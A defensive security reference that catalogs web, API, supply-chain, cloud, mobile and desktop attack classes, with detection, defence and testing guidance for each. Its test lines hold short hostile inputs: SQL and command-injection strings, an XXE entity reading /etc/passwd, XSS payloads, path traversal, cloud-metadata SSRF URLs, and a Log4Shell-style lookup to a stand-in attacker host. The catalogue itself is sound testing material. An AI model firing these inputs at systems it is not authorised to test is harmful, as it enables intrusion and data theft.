# Attack Catalog — Threats, Detection & Defense

A working taxonomy of how systems get attacked and how to defend each class.
Use it as the checklist for Phase 3 (audit) and the playbook source for Phase 5
(harden). Scope coverage by tier (`security-tiers.md`): Basic/Standard focus on
the OWASP Top 10; Hardened/Maximum add supply chain, secrets/crypto depth,
infra/DoS, mobile/desktop, and advanced/APT classes.

Each entry: **what it is → how to detect in code → how to defend → how to test**.

---

## A. Injection (OWASP A03)

### A1. SQL / NoSQL injection
- **What**: untrusted input concatenated into a query alters its logic.
- **Detect**: string-built queries, f-strings/`+` into SQL, `$where`/`$ne` in
  Mongo from user input, ORMs used with raw fragments.
- **Defend**: parameterized queries / prepared statements; ORM bound params;
  allowlist column/sort names; least-privilege DB accounts; input validation.
- **Test**: `' OR '1'='1`, time-based `SLEEP`, boolean-blind, NoSQL operator
  injection (`{"$gt":""}`). Verify parameterization neutralizes them.

### A2. OS command injection
- **What**: input reaches a shell.
- **Detect**: `exec`, `system`, `child_process`, `os.system`, `Runtime.exec`,
  backticks, shell=True.
- **Defend**: avoid shells; use array-arg APIs; allowlist; no shell metachar
  passthrough; escape only as last resort.
- **Test**: `; id`, `$(id)`, `| whoami`, newline injection.

### A3. Template / expression injection (SSTI), SSJI, LDAP, XPath, header/CRLF
- **SSTI**: user input rendered by a template engine (Jinja2, Twig, Freemarker,
  Velocity, Handlebars) reaches code execution. **Test**: `{{7*7}}`, `${7*7}`,
  `#{7*7}` reflected as `49`.
- **SSJI (server-side JS injection)**: untrusted input into `eval`, `Function`,
  `vm` module, or a JS template engine. **Defend**: never `eval` input; sandbox.
- **LDAP / XPath**: parameterize/escape per the target grammar.
- **Header / CRLF injection**: strip CR/LF from values placed into headers.
- **General defend**: don't render user input as templates; sandbox engines;
  encode for the target grammar.

### A4. XXE (XML External Entity) injection
- **What**: an XML parser resolves attacker-supplied external entities/DTDs →
  file read, SSRF, or DoS (billion-laughs). Common in SAML, SOAP, SVG/`docx`/
  `xlsx` upload parsing, and any XML ingest.
- **Detect**: XML parsers with DTD/external-entity resolution enabled (Java
  `DocumentBuilderFactory` defaults, .NET `XmlDocument`, PHP `libxml`, Python
  `lxml`/`xml.etree` on untrusted input).
- **Defend**: disable DTDs and external entity resolution
  (`FEATURE_SECURE_PROCESSING`, `disallow-doctype-decl`); use defusedxml in
  Python; prefer JSON; cap entity expansion.
- **Test**: a doc with `<!ENTITY xxe SYSTEM "file:///etc/passwd">` referenced in
  the body; check for file disclosure or outbound resolution.

### A5. JNDI / Log4Shell-class injection
- **What**: a logging/JNDI lookup evaluates attacker-controlled strings and
  fetches a remote class (e.g. `${jndi:ldap://attacker/x}` in Log4j) → RCE.
- **Detect**: vulnerable Log4j2 versions; any code logging user input through a
  framework that performs interpolation/JNDI lookups.
- **Defend**: patch logging libs; disable message lookups; restrict JNDI; egress
  filtering. **Test**: log a benign `${jndi:ldap://127.0.0.1:1389/test}` against
  your own listener and watch for the outbound resolution.

---

## B. Cross-Site Scripting (XSS) & output handling

- **Reflected / Stored / DOM-based XSS**: untrusted data rendered as HTML/JS.
- **Detect**: `innerHTML`, `dangerouslySetInnerHTML`, `v-html`, unescaped
  template interpolation, `document.write`, `eval`, building DOM from input.
- **Defend**: contextual output encoding; framework auto-escaping (don't bypass);
  a strict **Content-Security-Policy**; `HttpOnly`/`SameSite` cookies; sanitize
  rich HTML with a vetted library (DOMPurify) server-side; Trusted Types.
- **Test**: `<script>alert(1)</script>`, `"><img src=x onerror=alert(1)>`,
  attribute/JS-context breakouts, DOM sink tracing.

---

## C. Broken Authentication & Session (OWASP A07)

- **Threats**: credential stuffing, brute force, weak password storage,
  session fixation, predictable tokens, missing MFA, account enumeration.
- **Defend**: strong password hashing — **argon2id** (≥19 MiB memory, ≥2
  iterations, 1 thread), **bcrypt** (cost ≥10, 12 recommended), or **scrypt**
  (N≥32768, r=8, p=1); never MD5/SHA1/plain. Follow the OWASP Password Storage
  Cheat Sheet for current minimums. Plus: rate limiting + lockout/backoff; MFA;
  rotate session IDs on login; secure random tokens; generic auth errors (no
  enumeration); short-lived sessions + idle timeout; `Secure`/`HttpOnly`/
  `SameSite` cookies.
- **JWT/OAuth/OIDC pitfalls**: `alg:none`, weak HMAC secret, no `exp`/`aud`/`iss`
  checks, algorithm confusion (RS256→HS256), missing token revocation, leaking
  tokens in URLs, open redirect in OAuth callback, PKCE absent on public clients.
  - **Header-injection variants**: `kid` injection (path traversal / SQLi via the
    key-id), and `jku`/`x5u`/`jwk` pointing at an attacker-controlled key source —
    **defend** by allowlisting key IDs/URLs and ignoring embedded keys.
  - **Refresh tokens**: enforce single-use rotation and detect reuse; handle the
    race where two concurrent refreshes present the same token.
- **Account recovery flows** (own vuln class): password reset, email/phone
  verification, OTP, account unlock. **Threats**: predictable/non-expiring/
  reusable reset tokens, host-header injection in reset links, enumeration via
  timing/response differences, no rate limit on OTP. **Defend**: high-entropy
  single-use tokens with short expiry, bind to the account, ignore client host
  header for links, generic responses, rate-limit, re-auth for sensitive changes.
- **Test**: login throttling, token tampering, expired/forged JWTs, `kid`/`jku`
  manipulation, refresh-token reuse, fixation, reset-token reuse/expiry,
  enumeration via timing/error differences.

---

## D. Broken Access Control (OWASP A01)

- **IDOR / BOLA**: object IDs not authorized per-request → access others' data.
- **Privilege escalation / function-level (BFLA)**: missing role checks on admin
  or write operations; mass assignment of `isAdmin`/`role`.
- **Path traversal**: `../` reaching files outside intended dir.
- **Defend**: enforce authorization server-side on *every* request at the object
  and function level (deny by default); ownership checks; never trust client
  role/ID; bind allowed fields explicitly (no mass assignment); canonicalize &
  confine file paths; signed/opaque identifiers where helpful.
- **Test**: swap IDs across accounts, call admin endpoints as a normal user,
  manipulate JSON to set privileged fields, `../../etc/passwd`.

---

## E. Security Misconfiguration & Hardening (OWASP A05)

- **Threats**: debug mode in prod, verbose errors/stack traces, default creds,
  open admin panels, directory listing, permissive CORS (`*` with credentials),
  missing security headers, unpatched components, overexposed cloud storage.
- **Defend**: secure defaults; disable debug; generic error pages; least
  privilege; lock down CORS to known origins; set headers — `Content-Security-
  Policy`, `Strict-Transport-Security`, `X-Content-Type-Options: nosniff`,
  `X-Frame-Options`/frame-ancestors, `Referrer-Policy`, `Permissions-Policy`;
  remove unused features/ports/services; config as code, reviewed.
- **Test**: header scan, CORS preflight abuse, error-triggering inputs, default
  credential checks.

---

## F. SSRF & Cryptographic Failures (OWASP A02 / A10)

### F1. SSRF
- **What**: server fetches an attacker-controlled URL → hits internal services,
  cloud metadata (169.254.169.254), files.
- **Defend**: allowlist outbound hosts/schemes; resolve & validate IPs (block
  private/link-local/loopback); no redirects to internal; drop `file://`/`gopher://`;
  isolate egress; require metadata v2/IMDSv2.
- **Test**: point fetchers at `http://169.254.169.254/`, `http://127.0.0.1`,
  DNS-rebinding, redirect-to-internal.

### F2. Cryptographic failures
- **Threats**: plaintext/weak transport, weak ciphers/hashes, hardcoded keys,
  ECB mode, static IVs, weak randomness (`Math.random` for tokens), no integrity.
- **Defend**: TLS everywhere (modern config, HSTS); AEAD ciphers (AES-GCM,
  ChaCha20-Poly1305); CSPRNG for tokens/keys; proper key management/rotation;
  hash passwords with argon2id/bcrypt; sign+verify where integrity matters.

---

## G. Insecure Design, Deserialization, File handling, Business logic

- **Insecure deserialization**: untrusted data into `pickle`, Java
  `ObjectInputStream`, PHP `unserialize`, unsafe YAML → RCE. **Defend**: avoid
  native deser of untrusted data; use data-only formats (JSON) with schema
  validation; signed payloads; safe loaders.
- **Unrestricted file upload**: **Defend** — validate type by content not
  extension, cap size, store outside webroot, randomize names, scan, never
  execute uploads, serve with correct/`nosniff` content-type.
- **Insecure design**: missing rate limits, no abuse cases, trust boundaries
  unclear. **Defend**: threat-model early; secure-by-design patterns; abuse-case
  tests.
- **Business-logic abuse** (Standard+): price/quantity tampering, negative
  amounts, coupon/discount stacking, loyalty/referral fraud, workflow-step
  skipping (e.g. hitting a post-payment endpoint directly), replaying steps.
  **Defend**: enforce invariants & state machines server-side; re-validate
  price/totals server-side; bind each step to prior steps; idempotency keys.
  **Test**: map multi-step flows; try skipping/replaying steps and tampering
  values.
- **Race conditions / TOCTOU** (Standard+): concurrent requests to limited-use
  resources (coupon/gift-card redeem, balance withdraw, one-per-account actions)
  exploit check-then-act gaps. **Defend**: atomic operations, DB row locks /
  unique constraints, idempotency, optimistic concurrency. **Test**: fire many
  concurrent requests at a single-use action and check for double-spend.

---

## H. CSRF, Clickjacking & Client-side

- **CSRF**: state-changing request forged via the victim's session. **Defend**:
  anti-CSRF tokens (synchronizer/double-submit), `SameSite` cookies, require
  custom headers / re-auth for sensitive actions.
- **Clickjacking**: **Defend** — `frame-ancestors`/`X-Frame-Options`.
- **Open redirect / tabnabbing**: validate redirect targets to allowlist;
  `rel=noopener`.
- **Prototype pollution / client logic**: avoid unsafe merges of user objects.

### H2. HTTP request smuggling & cache poisoning (Hardened+)
- **Request smuggling**: `CL.TE`/`TE.CL` desync between a front-end proxy and
  back-end origin lets an attacker prepend requests to others' connections.
  **Defend**: consistent, strict parsing front-to-back; prefer HTTP/2 end-to-end;
  reject ambiguous `Content-Length`/`Transfer-Encoding`. **Test**: known CL.TE/
  TE.CL probes (carefully, against your own stack).
- **Web cache poisoning / deception**: unkeyed inputs (headers) influence cached
  responses served to others. **Defend**: include all influential inputs in the
  cache key; don't reflect unkeyed headers; mark sensitive responses `no-store`.

### H3. Subdomain takeover (Hardened+)
- **What**: a dangling DNS record (CNAME) points to a deprovisioned cloud
  service (S3/GitHub Pages/Heroku/Azure/Fastly) an attacker can claim.
- **Defend**: inventory DNS; remove dangling records on decommission; monitor.
- **Test**: enumerate subdomains; flag CNAMEs to unclaimed services.

### H4. Webhook security (Hardened+)
- **What**: inbound webhooks (Stripe/GitHub/Slack) accepted without verifying the
  sender → spoofed events. Also replay.
- **Defend**: verify HMAC signatures with the shared secret; check timestamp &
  reject replays; allowlist source IPs where published. **Test**: send a forged
  payload without/with a wrong signature; confirm rejection.

---

## I. API-Specific Threats (OWASP API Security Top 10 2023)

> For SSRF (API7:2023) see Section F1. The 2023 edition renumbered the list;
> map findings to 2023 IDs (see `compliance-mapping.md`).

- BOLA/BFLA (see D), broken object-property-level authorization (excessive data
  exposure + mass assignment), unrestricted resource consumption (rate/quotas),
  improper inventory (shadow/old API versions), unrestricted access to sensitive
  business flows, unsafe consumption of upstream APIs.
- **Defend**: per-object & per-function authz, response shaping/DTOs, quotas &
  rate limits, API gateway, version inventory, schema validation (OpenAPI),
  validate data from third-party APIs.

### I-GraphQL. GraphQL-specific attacks
- **Batching abuse**: many operations in one request to bypass per-request rate
  limits. **Defend**: limit/forbid batching; rate-limit by cost not request count.
- **Alias/field duplication**: requesting an expensive field thousands of times
  via aliases to defeat naive complexity limits. **Defend**: cost analysis that
  counts aliased duplicates.
- **Query depth/complexity bombs**: deeply nested queries. **Defend**: depth +
  complexity limits together (not just one).
- **Introspection as OSINT**: enumerate the full schema. **Defend**: disable
  introspection in prod.
- **Resolver/field-level authz gaps**: auth enforced only at the operation, not
  per resolver → BOLA. **Defend**: enforce authz in each resolver.
- **Subscription auth bypass**: WebSocket subscriptions skip the auth applied to
  queries/mutations. **Defend**: same authn/authz on subscriptions.
- **Persisted-query bypass**: arbitrary queries accepted where only persisted
  ones should be. **Defend**: enforce a persisted-query allowlist.

---

## J. Supply Chain & Dependencies (OWASP A06 — Hardened+)

- **Threats**: known-vulnerable deps (CVEs), typosquatting, dependency
  confusion, malicious/compromised packages, install scripts, poisoned build
  pipeline, unsigned artifacts.
- **Defend**: lockfiles + pinned versions; automated dependency audit
  (npm/pip/cargo audit, OSV, Dependabot); SBOM (CycloneDX/SPDX); verify
  integrity/signatures; scope internal registries to prevent confusion; review
  postinstall scripts; minimal base images; least-privilege CI tokens; protect
  the pipeline (branch protection, required reviews, no secrets in logs).
- **Test**: `npm/pip audit`, OSV scan, check for unpinned/`latest` deps.

### J-CI/CD. Pipeline security (Hardened+)
- **Threats**: `pull_request_target` (or equivalents) running untrusted fork code
  with secrets; **script injection** via untrusted inputs interpolated into shell
  steps (e.g. `${{ github.event.pull_request.title }}` inside `run:`); poisoned
  pipeline execution via write access to workflow files; unpinned actions
  (mutable tags/branches — see Section J); OIDC/cloud-token abuse; self-hosted
  runner compromise; unsigned build artifacts.
- **Defend**: use `pull_request` (not `pull_request_target`) for untrusted code;
  never interpolate untrusted `github.event.*` into `run:` — pass via `env:` and
  quote; pin actions to commit SHAs; least-privilege `GITHUB_TOKEN` permissions;
  protect workflow files with branch protection/required review; short-lived OIDC
  creds; ephemeral/isolated runners; sign & verify artifacts (Sigstore/cosign).
- **Test**: grep workflows for `pull_request_target` + checkout of PR head;
  `${{ github.event.* }}` used in `run:`; `@main`/`@master`/floating tags in
  `uses:`.

---

## K. Secrets Management (Hardened+)

- **Threats**: secrets in source/history, `.env` committed, keys in client
  bundles, secrets in logs/error messages, long-lived static credentials.
- **Defend**: secret scanning (gitleaks/trufflehog, GitHub secret scanning);
  vault/secret manager; env injection at runtime; short-lived/rotated creds;
  `.gitignore` for env; pre-commit hooks; **rotate any exposed secret**.
- **Reporting rule**: report location+type only, never the value.

---

## L. Infrastructure, Containers & Cloud (Hardened/Maximum)

- **Threats**: over-permissive IAM, public buckets, exposed dashboards
  (k8s/Docker API), containers as root, no network policy, no resource limits,
  unencrypted data at rest, missing logging.
- **Defend**: least-privilege IAM; private by default; CIS-benchmark hardening
  (see compliance map); non-root containers, read-only FS, dropped caps; network
  segmentation/policies; secrets via manager; encryption at rest; centralized
  audit logging & alerting; IaC scanning (tfsec/checkov/kube-linter).

---

## M. Availability / DoS & Resource abuse (Maximum)

- **Threats**: unbounded loops/recursion, ReDoS (catastrophic regex), zip bombs,
  large-payload/`Content-Length` abuse, amplification, no rate limiting, GraphQL
  query depth/complexity bombs, expensive endpoints.
- **Defend**: rate limiting & quotas; request/body size caps; timeouts &
  circuit breakers; bounded pagination; regex review / safe engines; GraphQL
  depth & complexity limits + cost analysis; autoscaling & WAF; backpressure.

---

## N. Mobile & Desktop client surface (selected target)

### Mobile (iOS/Android) — OWASP MASVS/MSTG
- **Threats**: insecure local storage (tokens/PII in plaintext, shared prefs,
  SQLite), no cert pinning (MITM), exported components/intents, insecure deep
  links, hardcoded keys in the binary, weak biometric/keystore use, debuggable
  builds, screenshot/clipboard leakage, insecure IPC.
- **Defend**: Keychain/Keystore for secrets; encrypt local data; certificate
  pinning; validate deep-link params & require auth; restrict exported
  components; obfuscate & strip debug; jailbreak/root awareness for high tiers;
  disable backups of sensitive data.
- **React Native / Flutter / hybrid**: secrets in the JS bundle or Dart
  snapshot are recoverable — keep them server-side; secure the JS↔native bridge
  and custom native modules; sign over-the-air (CodePush/OTA) updates and verify
  before applying; pin certs at the native layer; for WebView-based hybrids apply
  the web XSS/CSP rules too.

### Desktop (Electron & native)
- **Electron threats**: `nodeIntegration` on with remote content (RCE via XSS),
  `contextIsolation` off, `webviewTag`/`enableRemoteModule` enabled, loading
  remote URLs, insecure protocol handlers, unsigned auto-update, secrets in app
  bundle, path traversal in IPC, unrestricted in-app navigation.
- **Electron defend**: `contextIsolation:true`, `nodeIntegration:false`,
  `sandbox:true`, `webviewTag:false`, `enableRemoteModule:false`,
  `allowRunningInsecureContent:false`; strict CSP; validate all IPC messages;
  restrict navigation via `will-navigate`/`setWindowOpenHandler`; signed &
  verified auto-updates; no remote code; least privilege for file/OS access
  (follow the official Electron Security Checklist).
- **Native desktop (Win32/WPF, Cocoa/SwiftUI, Qt/GTK)**: insecure update
  channels, missing code signing/notarization, DLL/dylib search-order hijack,
  insecure IPC/named pipes, secrets in the bundle, over-broad entitlements.
  **Defend**: code-sign & notarize; signed updates over TLS; validate IPC; least
  privilege/entitlements; load libraries from trusted absolute paths.

---

## O. Advanced / APT-grade scenarios (Maximum tier)

- **Lateral movement & persistence**: assume breach; segment networks; rotate
  creds; detect anomalous east-west traffic; immutable infra.
- **Privilege escalation chains**: minimize SUID/capabilities, patch kernel/
  runtime, monitor for escalation primitives.
- **Data exfiltration & covert channels**: egress filtering, DLP, anomaly
  detection on outbound volume.
- **Insider & social engineering**: least privilege, separation of duties,
  audited access, phishing-resistant MFA (FIDO2/passkeys).
- **Zero-trust posture**: authenticate & authorize every request; no implicit
  network trust; continuous verification; comprehensive audit logging + SIEM.
- **Detection & response**: logging of security events, alerting, tested
  incident-response runbook, backups + tested restore, tamper-evident logs.

---

## Cross-cutting defenses (apply at every tier appropriate level)
- Validate input (allowlist) and encode output for context.
- Deny by default; least privilege everywhere.
- Defense in depth — never rely on a single control.
- Fail securely (errors don't reveal internals or open access).
- Log security events without logging secrets/PII.
- Keep dependencies and runtimes patched.
- Make security testable and re-runnable (CI gate).
